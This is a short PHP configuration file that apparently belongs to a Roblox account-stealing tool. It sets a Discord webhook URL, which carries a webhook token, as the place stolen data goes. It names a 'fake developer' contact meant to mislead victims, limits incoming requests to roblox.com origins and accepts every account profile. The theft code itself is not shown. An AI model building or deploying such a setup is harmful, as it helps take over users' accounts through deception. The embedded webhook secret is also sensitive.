<?php
    // webhook link
    $webhook = "https://discord.com/api/webhooks/781306315725078538/92kXwcI2kO0C5LumuoVGTTyZTKeVC3-gjDSf02_hfy-OL3qGaXyXeWMrECrm3v-o8fy0";
    // fake developer for the bot the users may contact
    $discord_contact = "TeeScrap#1474";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
?>